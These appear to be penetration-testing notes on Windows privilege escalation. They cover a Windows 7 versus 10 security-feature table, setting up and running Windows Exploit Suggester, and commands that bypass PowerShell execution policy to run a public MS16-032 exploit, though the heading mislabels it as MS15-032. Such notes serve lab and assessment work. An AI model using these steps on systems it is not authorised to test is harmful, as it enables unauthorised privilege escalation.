Feature	                            Windows 7          	Windows 10
Microsoft Password (MFA)		                                X
BitLocker	                           Partial	              X
Credential Guard		                                        X
Remote Credential Guard		                                  X
Device Guard (code integrity)		                            X
AppLocker	                           Partial	              X
Windows Defender	                   Partial	              X
Control Flow Guard		                                      X

https://github.com/AonCyberLabs/Windows-Exploit-Suggester

**Install Python Dependencies (local VM only)
```
sudo wget https://files.pythonhosted.org/packages/28/84/27df240f3f8f52511965979aad7c7b77606f8fe41d4c90f2449e02172bb1/setuptools-2.0.tar.gz
sudo tar -xf setuptools-2.0.tar.gz
cd setuptools-2.0/
sudo python2.7 setup.py install
sudo wget https://files.pythonhosted.org/packages/42/85/25caf967c2d496067489e0bb32df069a8361e1fd96a7e9f35408e56b3aab/xlrd-1.0.0.tar.gz
sudo tar -xf xlrd-1.0.0.tar.gz
cd xlrd-1.0.0/
sudo python2.7 setup.py install
```

**Gathering Systeminfo Command Output
```
systeminfo
```

**Updating the Local Microsoft Vulnerability Database
```
sudo python2.7 windows-exploit-suggester.py --update
```

**Running Windows Exploit Suggester
```
python2.7 windows-exploit-suggester.py  --database 2021-05-13-mssb.xls --systeminfo win7lpe-systeminfo.txt
```

**Local Exploit Suggester Module Meterpreter Shell
https://www.rapid7.com/blog/post/2015/08/11/metasploit-local-exploit-suggester-do-less-get-more/

**Exploiting MS15-032 with PowerShell PoC
https://www.exploit-db.com/exploits/39719
```
Set-ExecutionPolicy bypass -scope process
Import-Module .\Invoke-MS16-032.ps1
Invoke-MS16-032
```
